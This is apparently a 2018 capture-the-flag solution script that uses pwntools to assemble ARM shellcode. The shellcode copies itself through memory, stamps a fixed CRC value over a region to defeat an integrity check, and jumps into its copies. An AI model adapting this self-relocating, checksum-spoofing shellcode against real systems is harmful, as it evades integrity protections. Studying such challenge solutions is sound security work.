#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
crc= 0x74d7f2d0
crc=0xcc0b89f6

shellcode = """
    mov r3,0x5000
    mov r11,0x1f000
    mov r4,0xf6000000
    add r4,0x890000
    add r4,0x0b00
    add r4,0xcc
start:
    mov r2,r3
    mov r1,start
loop:
    ldm r1!,{r5-r8}
    stm r3!,{r5-r8}
    str r4,[r11]
    add r11,4
    cmp r11,0x20000
    bl continue
    mov r11,0x1f000
continue:
    cmp r1,end
    bl loop
    cmp r3,0x1f000
    bl reset_r3
    add r3,0x1000
    b stop_if
reset_r3:
    mov r3,0x1000
stop_if:
    mov pc,r2
crc:
    .ascii "\xcc\x0b\x89\xf6\xcc\x0b\x89\xf6\xcc\x0b\x89\xf6\xcc\x0b\x89\xf6"
   // .ascii "\x7f\xd7\xf2\xd0\x7f\xd7\xf2\xd0\x7f\xd7\xf2\xd0\x7f\xd7\xf2\xd0\x7f\xd7\xf2\xd0\x7f\xd7\xf2\xd0\x7f\xd7\xf2\xd0\x7f\xd7\xf2\xd0"
end:
"""
import base64
code=asm(shellcode,arch="arm")
print base64.b64encode(code)
with open("bin","w+") as f:
    f.write(code)



